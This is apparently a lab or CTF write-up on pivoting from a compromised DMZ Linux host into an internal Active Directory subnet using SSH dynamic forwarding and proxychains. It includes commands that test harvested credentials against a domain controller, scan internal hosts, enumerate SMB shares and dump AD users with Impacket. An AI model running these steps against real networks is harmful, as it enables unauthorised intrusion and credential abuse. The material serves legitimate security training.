# Network Pivoting & SSH Dynamic Port Forwarding

## Overview
- **Objective:** Pivot network traffic from the external attacker workstation (Kali Linux) into the isolated Active Directory internal subnet (`192.168.98.0/24`) via the compromised DMZ Linux host.
- **Pivot Host:** Compromised DMZ Linux machine (`192.168.80.x` / `10.10.x.x` external interface, multi-homed with `192.168.98.x` internal interface).
- **Target Network:** Internal AD Network (`192.168.98.0/24`).

---

## 1. Key AD Reconnaissance Indicator: Port 53 & Port 88

During port scanning and reconnaissance, identifying specific service pairings reliably finger-prints an **Active Directory Domain Controller (DC)**:

| Port | Protocol / Service | Significance in AD |
| :--- | :--- | :--- |
| **53** | DNS (Domain Name System) | Active Directory relies heavily on dynamic DNS (SRV records) for domain locating (`_ldap._tcp.dc._msdcs.<Domain>`). |
| **88** | Kerberos Authentication | The Domain Controller functions as the Key Distribution Center (KDC), serving Ticket Granting Tickets (AS-REQ / AS-REP) and Service Tickets (TGS-REQ / TGS-REP). |
| **389 / 636** | LDAP / LDAPS | Directory queries and object management. |
| **445** | SMB (Server Message Block) | SYSVOL / NETLOGON access, RPC transport, and file sharing. |

> **Rule of Thumb:** If an internal IP has both **Port 53 (DNS)** and **Port 88 (Kerberos)** open concurrently, the host is almost certainly an **Active Directory Domain Controller (DC)**.

---

## 2. Deep Dive: How Pivoting & Dynamic Port Forwarding Work

### The Network Bottleneck
Your Kali machine cannot route packets directly to `192.168.98.0/24` because that subnet is non-routable over the public/VPN boundary and has no default route leading to your attacker interface. 

The compromised DMZ Linux box is **dual-homed**:
1. Interface 1 faces the reachable network (where your SSH session connects).
2. Interface 2 faces the private Active Directory subnet (`192.168.98.0/24`).

```
+------------------+         Encrypted SSH Tunnel         +----------------------+             Internal Traffic            +------------------------+
|   Kali Workstation| ==================================> | Compromised DMZ Host | --------------------------------------> |  Internal AD Network   |
| (Attacker Machine)|      (Carrying SOCKS5 Payload)      |    (The Pivot Node)  |       (Originates from DMZ Host)        |  (192.168.98.0/24)     |
|                   |                                     |                      |                                         |                        |
|  127.0.0.1:1080   |                                     |  Dual-Homed Routing  |                                         | 192.168.98.2 (DC)      |
|  [SOCKS5 Listener]|                                     |                      |                                         | 192.168.98.30 (Host)   |
+------------------+                                     +----------------------+                                         +------------------------+
         ^                                                                                                                             ^
         |                                                                                                                             |
         +---- Tools wrapped in proxychains (e.g., crackmapexec smb 192.168.98.2) ----------------------------------------------------+
```

### Dynamic Port Forwarding Explained
Unlike local port forwarding (which forwards a single port to a single destination host), **Dynamic Port Forwarding (`ssh -D`)** turns your SSH client into a local **SOCKS4/SOCKS5 proxy server**.

1. **Local Socket Creation:** When you run `ssh -D 1080 user@pivot`, SSH creates a local TCP listening port on `127.0.0.1:1080` on your Kali machine.
2. **SOCKS Protocol Handshake:** When a tool sends data to `127.0.0.1:1080`, it speaks the SOCKS protocol, telling SSH: *"Please connect me to IP `192.168.98.2` on port `445`."*
3. **Encrypted Tunneling:** The SSH client encapsulates this request inside the existing encrypted SSH stream across the network to the DMZ Linux box.
4. **Proxy Execution:** The SSH daemon (`sshd`) on the DMZ host unpacks the payload, opens a standard TCP socket directly to `192.168.98.2:445` via its internal network interface, and proxies the raw TCP data back and forth.
5. **Perspective of the Target:** To the Domain Controller (`192.168.98.2`), the TCP connection appears to originate entirely from the **DMZ host's internal IP address**, bypassing edge firewall restrictions.

---

## 3. Step-by-Step Configuration & Execution

### Step 1: Establish the SSH Dynamic SOCKS Tunnel
From your Kali workstation terminal, establish the SSH dynamic tunnel in the background:

```bash
# -D 1080 : Opens a local SOCKS proxy on port 1080
# -N      : Do not execute a remote command (only forward ports)
# -f      : Requests SSH to go to the background just before command execution
# -q      : Quiet mode (suppresses warnings/diagnostic messages)
ssh -D 1080 -q -C -N -f privilege@<DMZ_HOST_IP>
```

Verify that the local SOCKS listener is running:
```bash
ss -tulpn | grep 1080
# or
netstat -tuln | grep 1080
```
Expected output:
```text
tcp   LISTEN 0      128        127.0.0.1:1080       0.0.0.0:*
```

---

### Step 2: Configure Proxychains

Proxychains hooks socket-related dynamic library functions (`connect()`, `gethostbyname()`) of dynamically linked programs via `LD_PRELOAD` to route their TCP connections through our SOCKS proxy.

Edit the Proxychains configuration file:
```bash
sudo nano /etc/proxychains4.conf
# (or /etc/proxychains.conf depending on distribution)
```

Ensure the following configuration settings:
1. Enable `dynamic_chain` or `strict_chain` (comment out `random_chain`).
2. Ensure `proxy_dns` is active if you want domain queries to resolve through the proxy.
3. At the very bottom of the file under `[ProxyList]`, configure the SOCKS5 proxy:

```ini
[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```

---

### Step 3: Executing Tools Through the Pivot

Prefix any dynamically-linked tool with `proxychains` or `proxychains4` to route traffic into the internal subnet.

#### 1. Validating Harvested Credentials Against the Domain Controller
```bash
proxychains nxc smb 192.168.98.2 -u "employee" -p "Doctor@963" -d Child
# or using classic crackmapexec:
proxychains crackmapexec smb 192.168.98.2 -u 'employee' -p 'Doctor@963' -d Child
```

#### 2. Service Enumeration on Internal Hosts
```bash
# TCP Connect Scan via proxychains (SYN scans like -sS do not work over SOCKS)
proxychains nmap -sT -Pn -p 88,135,139,389,445,3389 192.168.98.2
```

#### 3. SMB Client & Share Enumeration
```bash
proxychains smbclient -L //192.168.98.2/ -U "Child\employee%Doctor@963"
```

#### 4. Dumping Domain Information via Impacket
```bash
proxychains impacket-GetADUsers -all -dc-ip 192.168.98.2 'Child.local/employee:Doctor@963'
```

---

## 4. Operational Caveats & Limitations of SOCKS/Proxychains

1. **TCP Only:** SOCKS proxies forward TCP streams. Standard ICMP (`ping`) and raw packet scans (such as `nmap -sS` SYN stealth scans, OS detection `-O`, or UDP sweeps) **will not work** through Proxychains. Always use `-sT` and `-Pn` with Nmap.
2. **DNS Resolution Latency:** If `proxy_dns` is enabled, domain name lookups are routed through the proxy. If internal DNS fails to resolve, configure `/etc/hosts` locally with internal mappings (e.g., `192.168.98.2 child.local dc.child.local`).
3. **Performance Overhead:** Every TCP socket connection undergoes SOCKS negotiation over the encrypted SSH tunnel, which causes noticeable latency on intensive port scans. Scan specifically targeted ports rather than full port ranges (`-p-`).